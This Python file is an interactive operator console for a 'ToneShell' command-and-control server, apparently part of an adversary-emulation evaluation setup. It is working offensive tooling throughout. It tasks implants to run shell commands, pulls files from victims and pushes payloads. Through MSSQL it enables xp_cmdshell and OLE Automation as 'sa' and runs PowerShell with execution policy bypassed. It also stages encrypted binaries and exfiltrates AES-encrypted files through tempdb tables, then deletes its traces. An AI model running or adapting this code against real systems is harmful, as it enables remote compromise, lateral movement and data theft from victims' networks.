#!/usr/bin/env python3
"""
toneshell_shell.py — Interactive shell for ToneShell C2 sessions.

Wraps evalsC2client's REST API with a persistent prompt so you don't have
to hand-craft JSON task strings or copy session GUIDs for every command.

Usage:
    python toneshell_shell.py [--port 9999]

Built-in commands (case-insensitive):
    sessions                        list active C2 sessions
    use <session_id>                attach to a session
    detach                          unattach (return to session-picker mode)
    get <remote_path>               upload file FROM implant to C2 server
    put <payload_name> <dest_path>  push file FROM server payloads dir TO implant
    kill                            send TERMINATE (id=255) to current implant
    xpinit <host:port> <login> <pass>       enable xp_cmdshell + sp_OA on MSSQL target
    xpshell cmd <cmd>               run cmd.exe command on MSSQL host via xp_cmdshell
    xpshell psh <ps_script>         stage and run PowerShell script on MSSQL host
    xpstage <payload> [--no-encrypt]        stage binary to MSSQL host via DB channel
    xpexfil <remote_path> <local_name>  exfil a file from MSSQL host to C2 via DB channel (AES-256-CBC + base64)
    help                            show this help
    exit / quit                     exit the shell

Anything else is sent as an EXEC (id=5) shell command to the current session.
"""

import argparse
import json
import random
import string
import sys
import time

try:
    import readline  # noqa: F401 – enables arrow-key history on Linux/Mac
except ImportError:
    pass  # Windows: no readline, input() still works

import requests
from datetime import datetime, timedelta

# ── REST API constants (mirrors evalsC2client.py) ──────────────────────────
API_RESP_TYPE_KEY    = "type"
API_RESP_STATUS_KEY  = "status"
API_RESP_DATA_KEY    = "data"
API_RESP_STATUS_OK   = 0

RESP_TYPE_CTRL         = 0
RESP_TYPE_VERSION      = 1
RESP_TYPE_CONFIG       = 2
RESP_TYPE_SESSIONS     = 3
RESP_TYPE_TASK_CMD     = 4
RESP_TYPE_TASK_OUTPUT  = 5
RESP_TYPE_TASK_INFO    = 6

TASK_STATUS_KEY    = "taskStatus"
TASK_GUID_KEY      = "guid"
TASK_COMMAND_KEY   = "command"
TASK_OUTPUT_KEY    = "taskOutput"
TASK_STATUS_NEW       = 0
TASK_STATUS_PENDING   = 1
TASK_STATUS_FINISHED  = 2
TASK_STATUS_DISCARDED = 3

# ── ToneShell packet type IDs ───────────────────────────────────────────────
TS_FILE_DOWNLOAD = 3   # server → implant (push file to implant)
TS_EXEC          = 5   # execute shell command on implant
TS_FILE_UPLOAD   = 7   # implant → server (pull file from implant)
TS_TERMINATE     = 255 # self-destruct


class ApiError(Exception):
    pass


# ── MSSQL xp_cmdshell / sp_OA / DB staging module ─────────────────────────

SCRIPT_CHUNK_SIZE = 1200   # chars of original content per sp_OA Write task
SP_OA_CREATE = 2           # Scripting.FileSystemObject OpenTextFile mode: create/overwrite
SP_OA_APPEND = 8           # Scripting.FileSystemObject OpenTextFile mode: append


class XpMssql:
    """Execution tunnel to IIS01 via WS01 TONESHELL → sqlcmd → MSSQL xp_cmdshell."""

    def __init__(self):
        self._host     = None
        self._login    = None
        self._password = None

    def ready(self) -> bool:
        return self._host is not None

    # ── helpers ─────────────────────────────────────────────────────────────

    def _rand_tmp(self, ext: str) -> str:
        stem = ''.join(random.choices(string.ascii_lowercase, k=8))
        return f"C:\\ProgramData\\{stem}.{ext}"

    def _tsql_escape(self, s: str) -> str:
        """Escape a value for embedding inside a T-SQL string literal '...'."""
        return s.replace("'", "''")

    def _sqlcmd_prefix(self) -> str:
        return f'sqlcmd -S {self._host} -U {self._login} -P {self._password} -C'

    def _exec_q(self, shell, tsql: str) -> str:
        """Send one sqlcmd -Q task. Escapes " for C runtime -Q "..." boundary only."""
        cmd = f'{self._sqlcmd_prefix()} -Q "{tsql.replace(chr(34), chr(34)*2)}"'
        return shell.cmd_exec_raw(cmd)

    def _sp_oa_write(self, shell, path: str, content: str):
        """Write content to a remote path on IIS01 via sp_OA FileSystemObject (chunked)."""
        for i, start in enumerate(range(0, len(content), SCRIPT_CHUNK_SIZE)):
            chunk = content[start:start + SCRIPT_CHUNK_SIZE]
            mode  = SP_OA_CREATE if i == 0 else SP_OA_APPEND
            # sp_OAMethod only accepts literals or variables, not expressions.
            # Use @v to hold the content: SET @v evaluates the expression first,
            # then sp_OAMethod receives the variable. CHAR(34) substitution keeps "
            # out of T-SQL string literals so _exec_q's " doubling never fires on content.
            segs     = chunk.split('"')
            val_expr = '+CHAR(34)+'.join(f"'{self._tsql_escape(s)}'" for s in segs)
            tsql  = (
                "EXECUTE AS LOGIN='sa';"
                "DECLARE @f INT,@x INT,@v NVARCHAR(MAX);"
                "EXEC sp_OACreate 'Scripting.FileSystemObject',@f OUT;"
                f"EXEC sp_OAMethod @f,'OpenTextFile',@x OUT,'{self._tsql_escape(path)}',{mode},1;"
                f"SET @v={val_expr};"
                "EXEC sp_OAMethod @x,'Write',NULL,@v;"
                "EXEC sp_OAMethod @x,'Close';"
                "EXEC sp_OADestroy @f;"
            )
            self._exec_q(shell, tsql)

    # ── commands ─────────────────────────────────────────────────────────────

    def cmd_xpinit(self, shell, host: str, login: str, password: str):
        """Enable sp_OA + xp_cmdshell on MSSQL and verify connectivity."""
        self._host     = host
        self._login    = login
        self._password = password
        setup = (
            "EXECUTE AS LOGIN='sa';"
            "EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE;"
            "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
        )
        self._exec_q(shell, setup)
        out = self._exec_q(shell, "EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'whoami'")
        print(f"[+] xpinit OK — context: {out.strip()}")

    def cmd_xpshell_cmd(self, shell, cmd: str):
        """Run a cmd.exe command on IIS01 via .bat staging; capture output."""
        bat      = self._rand_tmp("bat")
        out_file = self._rand_tmp("txt")
        self._sp_oa_write(shell, bat, f"{cmd} > {out_file} 2>&1\r\n")
        self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell '{self._tsql_escape(bat)}'")
        output = self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'type {self._tsql_escape(out_file)}'")
        self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(bat)} {self._tsql_escape(out_file)}'")
        print(output)

    def cmd_xpshell_psh(self, shell, script: str):
        """Stage and run a PowerShell script on IIS01; stdout captured by xp_cmdshell."""
        ps1 = self._rand_tmp("ps1")
        self._sp_oa_write(shell, ps1, script)
        run_tsql = (
            "EXECUTE AS LOGIN='sa';"
            f"EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -NoProfile -File {self._tsql_escape(ps1)}'"
        )
        output = self._exec_q(shell, run_tsql)
        self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(ps1)}'")
        print(output)

    def cmd_xpstage(self, shell, payload_name: str, encrypt: bool = True):
        """Stage a binary to IIS01 via MSSQL DB channel (no HTTP from IIS01)."""
        resp     = shell._post_json("/api/v1.0/mssql/stage", {
            "handler": "toneshell",
            "payload": payload_name,
            "encrypt": encrypt,
        })
        sql_file = resp["sqlFile"]
        key_b64  = resp.get("key", "")

        # Transfer INSERT SQL to WS01, block until implant confirms receipt
        remote_sql = f"C:\\Windows\\Temp\\{sql_file}"
        shell.cmd_put_wait(sql_file, remote_sql)

        # Run INSERT via sqlcmd -i (not subject to 2048 cmd limit)
        shell.cmd_exec_raw(f'{self._sqlcmd_prefix()} -i {remote_sql}')

        # Build and run the extract+decrypt PowerShell script on IIS01
        out_path = f"C:\\ProgramData\\{payload_name}"
        ps = self._build_decrypt_ps(key_b64, out_path) if (encrypt and key_b64) \
             else self._build_plain_ps(out_path)
        self.cmd_xpshell_psh(shell, ps)

        # Cleanup — del is a cmd builtin; DROP TABLE goes direct via _exec_q (avoids nested quote hell)
        shell.cmd_exec_raw(f'cmd /c del /f {remote_sql}')
        self._exec_q(shell, "EXECUTE AS LOGIN='sa';IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
        print(f"[+] xpstage done → {out_path}")

    def _build_decrypt_ps(self, key_b64: str, out_path: str) -> str:
        # SqlClient uses comma for port (host,port), sqlcmd uses colon — convert
        sqlclient_host = self._host.replace(':', ',')
        connstr = f'Server={sqlclient_host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
        return (
            f"$k=[Convert]::FromBase64String('{key_b64}');"
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            "$cm.CommandText='SELECT chunk FROM tempdb..stg ORDER BY id';"
            "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
            "$rd.Close();$cn.Close();"
            "$raw=[System.Text.Encoding]::ASCII.GetBytes($sb.ToString());"
            "$t=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$ms=New-Object System.IO.MemoryStream;"
            "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
            "$b=$ms.ToArray();"
            "$a=[System.Security.Cryptography.Aes]::Create();"
            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$b[0..15];"
            "$ct=$b[16..($b.Length-1)];"
            "$dec=$a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);"
            f"[IO.File]::WriteAllBytes('{out_path}',$dec)"
        )

    def _build_plain_ps(self, out_path: str) -> str:
        sqlclient_host = self._host.replace(':', ',')
        connstr = f'Server={sqlclient_host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
        return (
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            "$cm.CommandText='SELECT chunk FROM tempdb..stg ORDER BY id';"
            "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
            "$rd.Close();$cn.Close();"
            "$raw=[System.Text.Encoding]::ASCII.GetBytes($sb.ToString());"
            "$t=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$ms=New-Object System.IO.MemoryStream;"
            "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
            "$b=$ms.ToArray();"
            f"[IO.File]::WriteAllBytes('{out_path}',$b)"
        )

    def _build_exfil_insert_ps(self, remote_path: str, key_b64: str) -> str:
        """PowerShell run on IIS01 via cmd_xpshell_psh: AES-encrypt file + INSERT into tempdb..exfil."""
        connstr = (f"Server={self._host.replace(':', ',')};"
                   f"Database=tempdb;User ID={self._login};Password={self._password};"
                   f"TrustServerCertificate=True")
        return (
            f"$raw=[IO.File]::ReadAllBytes('{remote_path}');"
            f"$k=[Convert]::FromBase64String('{key_b64}');"
            "$a=[System.Security.Cryptography.Aes]::Create();"
            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.GenerateIV();"
            "$enc=$a.CreateEncryptor().TransformFinalBlock($raw,0,$raw.Length);"
            "$blob=[byte[]]($a.IV)+$enc;"
            "$t2=New-Object System.Security.Cryptography.ToBase64Transform;"
            "$ms2=New-Object System.IO.MemoryStream;"
            "$cs2=New-Object System.Security.Cryptography.CryptoStream($ms2,$t2,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs2.Write($blob,0,$blob.Length);$cs2.FlushFinalBlock();"
            "$b64=[System.Text.Encoding]::ASCII.GetString($ms2.ToArray());"
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            "$cm.CommandText=\"IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
            "CREATE TABLE tempdb..exfil(id INT IDENTITY(1,1),chunk NVARCHAR(MAX));GRANT SELECT ON exfil TO PUBLIC;\";"
            "$cm.ExecuteNonQuery()|Out-Null;"
            "$cs=8000;$n=[Math]::Ceiling($b64.Length/$cs);"
            "for($i=0;$i -lt $n;$i++){"
            "  $chunk=$b64.Substring($i*$cs,[Math]::Min($cs,$b64.Length-$i*$cs));"
            "  $cm2=$cn.CreateCommand();"
            "  $cm2.CommandText=\"INSERT INTO tempdb..exfil(chunk) VALUES (N'$($chunk.Replace(\"'\",\"''\"))'\"+')';"
            "  $cm2.ExecuteNonQuery()|Out-Null"
            "};"
            "$cn.Close();"
            "Write-Output 'exfil INSERT done'"
        )

    def _build_exfil_extract_ps(self, local_path: str, key_b64: str) -> str:
        """PowerShell run on WS01 via cmd_exec_raw: read tempdb..exfil, decode, decrypt, write file."""
        connstr = (f"Server={self._host.replace(':', ',')};"
                   f"Database=tempdb;User ID={self._login};Password={self._password};"
                   f"TrustServerCertificate=True")
        return (
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            "$cm.CommandText='SELECT chunk FROM tempdb..exfil ORDER BY id';"
            "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
            "$rd.Close();$cn.Close();"
            "$raw=[System.Text.Encoding]::ASCII.GetBytes($sb.ToString());"
            "$t=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$ms=New-Object System.IO.MemoryStream;"
            "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
            "$blob=$ms.ToArray();"
            f"$k=[Convert]::FromBase64String('{key_b64}');"
            "$a=[System.Security.Cryptography.Aes]::Create();"
            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$blob[0..15];"
            "$ct=$blob[16..($blob.Length-1)];"
            "$dec=$a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);"
            f"[IO.File]::WriteAllBytes('{local_path}',$dec)"
        )

    def cmd_xpexfil(self, shell, remote_path: str, local_name: str):
        """Exfil a file from IIS01 to controlServer via MSSQL DB channel (AES-256-CBC + base64)."""
        import os
        import base64 as _b64
        key_b64   = _b64.b64encode(os.urandom(32)).decode()
        local_tmp = f"C:\\Windows\\Temp\\{local_name}"

        print("[*] xpexfil: encrypting and inserting into tempdb..exfil ...")
        self.cmd_xpshell_psh(shell, self._build_exfil_insert_ps(remote_path, key_b64))

        print("[*] xpexfil: extracting to WS01 ...")
        extract_ps = self._build_exfil_extract_ps(local_tmp, key_b64)
        shell.cmd_exec_raw(f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{extract_ps}"')

        print(f"[*] xpexfil: pulling {local_name} from WS01 ...")
        shell.cmd_get(local_tmp)

        self._exec_q(shell,
            "EXECUTE AS LOGIN='sa';"
            "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
        )
        shell.cmd_exec_raw(f"cmd /c del /f {local_tmp}")
        print(f"[+] xpexfil done → {local_name}")


class ToneShellShell:
    def __init__(self, port: str):
        self.port      = port
        self.base_url  = f"http://localhost:{port}/api/v1.0"
        self.session   = None   # currently attached session GUID
        self.hostname  = None   # display name for the session
        self._task_num = random.randint(1000, 60000)  # random offset avoids taskNum collision on shell restart
        self._xp       = XpMssql()

    # ── internal helpers ────────────────────────────────────────────────────

    def _next_task_num(self) -> int:
        n = self._task_num
        self._task_num += 1
        return n

    def _extract(self, resp: requests.Response, expected_type: int):
        d = resp.json()
        if d.get(API_RESP_STATUS_KEY) != API_RESP_STATUS_OK:
            raise ApiError(d.get(API_RESP_DATA_KEY, "unknown error"))
        if d.get(API_RESP_TYPE_KEY) != expected_type:
            raise ApiError(f"expected response type {expected_type}, got {d.get(API_RESP_TYPE_KEY)}")
        return d[API_RESP_DATA_KEY]

    def _post_json(self, path: str, payload: dict) -> dict:
        resp = requests.post(f"http://localhost:{self.port}{path}", json=payload)
        return resp.json()

    def _post_task(self, task_json: dict) -> dict:
        url  = f"{self.base_url}/session/{self.session}/task"
        body = json.dumps(task_json)
        resp = requests.post(url, body)
        return self._extract(resp, RESP_TYPE_TASK_INFO)

    def _poll_output(self, task_guid: str, timeout_s: int = 120) -> str | None:
        url      = f"{self.base_url}/task/{task_guid}"
        deadline = datetime.now() + timedelta(seconds=timeout_s)
        while datetime.now() < deadline:
            resp = requests.get(url)
            try:
                data   = self._extract(resp, RESP_TYPE_TASK_INFO)
                status = data[TASK_STATUS_KEY]
                if status == TASK_STATUS_FINISHED:
                    return data.get(TASK_OUTPUT_KEY, "")
                if status == TASK_STATUS_DISCARDED:
                    print("[!] task discarded by server")
                    return None
            except ApiError:
                pass
            time.sleep(2)
        print("[!] timed out waiting for output")
        return None

    # ── built-in commands ───────────────────────────────────────────────────

    def cmd_sessions(self):
        resp     = requests.get(f"{self.base_url}/sessions")
        sessions = self._extract(resp, RESP_TYPE_SESSIONS) or []
        if not sessions:
            print("  (no active sessions)")
            return
        print(f"  {'SESSION ID':<36}  HOSTNAME")
        print(f"  {'-'*36}  {'-'*24}")
        for s in sessions:
            guid     = s.get("guid", "?")
            hostname = s.get("hostName", s.get("hostname", "?"))
            marker   = " *" if guid == self.session else "  "
            print(f"{marker}{guid}  {hostname}")

    def cmd_use(self, session_id: str):
        resp     = requests.get(f"{self.base_url}/session/{session_id}")
        data     = self._extract(resp, RESP_TYPE_SESSIONS)
        if isinstance(data, list):
            data = data[0]
        self.session  = session_id
        self.hostname = data.get("hostName", data.get("hostname", session_id[:8]))
        print(f"[+] attached to {self.hostname} ({session_id})")

    def cmd_detach(self):
        print(f"[*] detached from {self.session}")
        self.session  = None
        self.hostname = None

    def cmd_exec(self, command: str):
        task_num = self._next_task_num()
        task     = {"id": TS_EXEC, "taskNum": task_num, "args": command}
        info     = self._post_task(task)
        task_guid = info[TASK_GUID_KEY]
        print(f"[*] task {task_guid} queued (taskNum={task_num}), waiting …")
        output = self._poll_output(task_guid)
        if output is not None:
            print(output, end="" if output.endswith("\n") else "\n")

    def cmd_exec_raw(self, command: str) -> str:
        """Send EXEC task, block on poll, return raw output string (no print)."""
        task_num = self._next_task_num()
        task     = {"id": TS_EXEC, "taskNum": task_num, "args": command}
        info     = self._post_task(task)
        output   = self._poll_output(info[TASK_GUID_KEY])
        return output or ""

    def cmd_get(self, remote_path: str):
        """Pull a file FROM the implant to the C2 server upload dir."""
        task_num = self._next_task_num()
        task     = {"id": TS_FILE_UPLOAD, "taskNum": task_num, "args": remote_path}
        info     = self._post_task(task)
        print(f"[*] file-get task {info[TASK_GUID_KEY]} queued (implant will push {remote_path})")

    def cmd_put_wait(self, payload_name: str, remote_dest: str):
        """Push a file to the implant and block until transfer is complete."""
        task_num = self._next_task_num()
        task     = {"id": TS_FILE_DOWNLOAD, "taskNum": task_num,
                    "args": remote_dest, "payload": payload_name}
        info     = self._post_task(task)
        print(f"[*] file-put task {info[TASK_GUID_KEY]} queued, waiting for transfer …")
        self._poll_output(info[TASK_GUID_KEY], timeout_s=180)

    def cmd_put(self, payload_name: str, remote_dest: str):
        """Push a file FROM the C2 server payloads dir TO the implant."""
        task_num = self._next_task_num()
        task     = {"id": TS_FILE_DOWNLOAD, "taskNum": task_num,
                    "args": remote_dest, "payload": payload_name}
        info     = self._post_task(task)
        print(f"[*] file-put task {info[TASK_GUID_KEY]} queued "
              f"(server/{payload_name} → implant:{remote_dest})")

    def cmd_kill(self):
        confirm = input("[!] send TERMINATE to implant? [y/N] ").strip().lower()
        if confirm != "y":
            print("[*] aborted")
            return
        task     = {"id": TS_TERMINATE}
        body     = json.dumps(task)
        url      = f"{self.base_url}/session/{self.session}/task"
        resp     = requests.post(url, body)
        print("[+] TERMINATE sent" if resp.ok else f"[-] {resp.text}")

    def cmd_output(self):
        url  = f"{self.base_url}/session/{self.session}/task/output"
        resp = requests.get(url)
        data = self._extract(resp, RESP_TYPE_TASK_OUTPUT)
        print(data or "(no output)")

    @staticmethod
    def cmd_help():
        print(__doc__)

    # ── main loop ───────────────────────────────────────────────────────────

    def prompt(self) -> str:
        if self.session:
            label = self.hostname or self.session[:8]
            return f"[{label}]> "
        return "[no session]> "

    def run(self):
        print("ToneShell interactive shell  (type 'help' for commands)")
        print(f"Connected to controlServer on port {self.port}\n")
        try:
            self.cmd_sessions()
        except Exception as e:
            print(f"[!] could not reach controlServer: {e}")

        while True:
            try:
                line = input(self.prompt()).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if not line:
                continue

            parts = line.split(None, 2)
            cmd   = parts[0].lower()

            try:
                if cmd in ("exit", "quit"):
                    break

                elif cmd == "help":
                    self.cmd_help()

                elif cmd == "sessions":
                    self.cmd_sessions()

                elif cmd == "use":
                    if len(parts) < 2:
                        print("usage: use <session_id>")
                    else:
                        self.cmd_use(parts[1])

                elif cmd == "detach":
                    if not self.session:
                        print("[*] not attached to any session")
                    else:
                        self.cmd_detach()

                elif cmd in ("output", "getoutput"):
                    if not self.session:
                        print("[!] not attached to a session")
                    else:
                        self.cmd_output()

                elif cmd == "get":
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(parts) < 2:
                        print("usage: get <remote_path>")
                    else:
                        self.cmd_get(parts[1])

                elif cmd == "put":
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(parts) < 3:
                        print("usage: put <payload_name> <remote_dest>")
                    else:
                        self.cmd_put(parts[1], parts[2])

                elif cmd == "kill":
                    if not self.session:
                        print("[!] not attached to a session")
                    else:
                        self.cmd_kill()

                elif cmd == "xpinit":
                    tokens = line.split(None, 3)
                    if len(tokens) < 4:
                        print("usage: xpinit <host:port> <login> <pass>")
                    elif not self.session:
                        print("[!] not attached to a session")
                    else:
                        self._xp.cmd_xpinit(self, tokens[1], tokens[2], tokens[3])

                elif cmd == "xpshell":
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(parts) < 3:
                        print("usage: xpshell cmd|psh <command_or_script>")
                    elif not self._xp.ready():
                        print("[!] run xpinit first")
                    elif parts[1] == "cmd":
                        self._xp.cmd_xpshell_cmd(self, parts[2])
                    elif parts[1] == "psh":
                        self._xp.cmd_xpshell_psh(self, parts[2])
                    else:
                        print("usage: xpshell cmd|psh <command_or_script>")

                elif cmd == "xpstage":
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(parts) < 2:
                        print("usage: xpstage <payload_name> [--no-encrypt]")
                    elif not self._xp.ready():
                        print("[!] run xpinit first")
                    else:
                        no_enc = len(parts) >= 3 and parts[2] == "--no-encrypt"
                        self._xp.cmd_xpstage(self, parts[1], encrypt=not no_enc)

                elif cmd == "xpexfil":
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(parts) < 3:
                        print("usage: xpexfil <remote_path> <local_name>")
                    elif not self._xp.ready():
                        print("[!] run xpinit first")
                    else:
                        self._xp.cmd_xpexfil(self, parts[1], parts[2])

                else:
                    if not self.session:
                        print("[!] not attached to a session — type 'sessions' then 'use <id>'")
                    else:
                        self.cmd_exec(line)

            except ApiError as e:
                print(f"[-] API error: {e}")
            except requests.ConnectionError:
                print(f"[-] cannot reach controlServer at {self.base_url}")
            except Exception as e:
                print(f"[-] {e}")

        print("[*] bye")


def main():
    parser = argparse.ArgumentParser(description="Interactive ToneShell C2 shell")
    parser.add_argument("--port", default="9999", metavar="PORT",
                        help="controlServer REST API port (default 9999)")
    args = parser.parse_args()
    ToneShellShell(args.port).run()


if __name__ == "__main__":
    main()
